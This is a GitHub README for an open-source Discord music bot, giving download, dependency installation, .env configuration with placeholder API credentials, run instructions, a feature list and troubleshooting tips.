# 🎶 advanced-discord-music-bot - Enjoy Music Anytime, Anywhere

[![Download Release](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/chantalmiriane19/advanced-discord-music-bot/releases)

## 📚 About

The Advanced Discord Music Bot offers a user-friendly way to stream music from various platforms like YouTube, Spotify, and SoundCloud directly into your Discord server. With features like 24/7 support, auto-resume, and an interactive dashboard, this bot makes it easy to enjoy high-quality music with friends.

## 🚀 Getting Started

To start using the Advanced Discord Music Bot, follow these simple steps to download and set it up on your computer.

### Step 1: System Requirements

Before downloading, ensure your system meets the following requirements:

- **Operating System:** Windows 10 or later, macOS Monterey or later, or a recent Linux distribution.
- **Node.js:** Version 16 or later installed on your system. You can download it from [Node.js official site](https://nodejs.org/).
- **Discord Account:** You will need an active Discord account and permissions to add bots to a server.

### Step 2: Visit the Download Page

To access the latest version of the Advanced Discord Music Bot, [visit this page to download](https://github.com/chantalmiriane19/advanced-discord-music-bot/releases). Here, you will find all available releases.

### Step 3: Choose Your Version

On the Releases page, you can see a list of versions. Click on the latest release to view more details. Scroll down to the "Assets" section. You will find a downloadable file, usually named `advanced-discord-music-bot.zip`.

### Step 4: Download the Bot

1. Click on the zip file to start downloading.
2. Wait for the download to complete. It may take a few moments depending on your internet speed.

### Step 5: Extract the Files

Once the download finishes, locate the `advanced-discord-music-bot.zip` file in your downloads folder. 

1. Right-click the file.
2. Select "Extract All…" from the context menu.
3. Choose a destination folder and click "Extract."

This will create a new folder containing all necessary files.

### Step 6: Install Dependencies

1. Open the terminal (Command Prompt on Windows or Terminal on macOS/Linux).
2. Navigate to the folder you just extracted. You can use the `cd` command followed by the path to your folder. For example:
   ```
   cd path\to\your\folder
   ```
3. Once in the folder, type the following command to install dependencies:
   ```
   npm install
   ```

Make sure that Node.js is already installed, or this command will not work.

### Step 7: Configure the Bot

You need to set up environment variables to connect the bot to your Discord server and music APIs.

1. Copy the `.env.example` file and rename it to `.env` in the bot's folder.
2. Open the `.env` file and fill in the required values:
   ```env
   TOKEN=Your_Discord_Bot_Token_Here
   PREFIX=!
   MONGO_URL=Your_MongoDB_Connection_URL_Here
   ```

#### Optional: Configure Music API Credentials

For enhanced functionality with Spotify and SoundCloud, you can configure API credentials:

**Spotify API Setup:**
1. Go to [Spotify Developer Dashboard](https://developer.spotify.com/dashboard)
2. Create a new app
3. Copy your Client ID and Client Secret
4. Add them to your `.env` file:
   ```env
   SPOTIFY_CLIENT_ID=your_spotify_client_id
   SPOTIFY_CLIENT_SECRET=your_spotify_client_secret
   ```

**SoundCloud API Setup:**
1. Visit [SoundCloud Developers](https://developers.soundcloud.com/)
2. Register your application
3. Copy your Client ID
4. Add it to your `.env` file:
   ```env
   SOUNDCLOUD_CLIENT_ID=your_soundcloud_client_id
   ```

**Note:** The bot will work without API credentials but with limited functionality. API credentials enable better rate limits and access to more features.

### Step 8: Run the Bot

To start the bot:

1. In your terminal, ensure you are still in the bot's folder.
2. Type the following command and hit enter:
   ```
   node index.js
   ```

If everything is set up correctly, the bot should launch and be ready to use in your Discord server.

### Step 9: Use the Bot

Once the bot is running, you can add music commands to your Discord server. Use slash commands to play, pause, skip, and manage your music preferences. Check the documentation within the bot for command details.

## 🎉 Features

- **24/7 Music Streaming:** Enjoy non-stop music with the ability to keep playing even when you're offline.
- **Auto-Resume:** If the bot disconnects, it will auto-resume the playlist from where it left off.
- **Multi-Platform Support:** Easily stream music from YouTube, Spotify, and SoundCloud.
- **Interactive Dashboard:** Access an easy-to-use interface to manage your music settings.
- **High-Definition Audio:** Enjoy clear and crisp sound quality while listening to your favorite tunes.

## 🛠 Troubleshooting

If you encounter any issues while downloading or running the bot, here are some common solutions:

- **Error: "Cannot find module":** Ensure Node.js is correctly installed and you have run `npm install`.
- **Bot not joining voice channel:** Make sure the bot has the necessary permissions in your server to connect to voice channels.
- **Token issues:** Double-check your Discord token in the `config.json` file for accuracy.
  
For further assistance, check the [issues section](https://github.com/chantalmiriane19/advanced-discord-music-bot/issues) on the GitHub page.

## 👥 Community

If you want to connect with others using the Advanced Discord Music Bot, join our community channel on Discord. Here, you can ask questions, share tips, and find new ways to enjoy your music experience.

## 📞 Support

For additional help, please check:
- [API Setup Guide](./API_SETUP_GUIDE.md) - Detailed instructions for configuring Spotify and SoundCloud APIs
- [Documentation](https://github.com/chantalmiriane19/advanced-discord-music-bot/wiki)
- Report an issue on the GitHub repository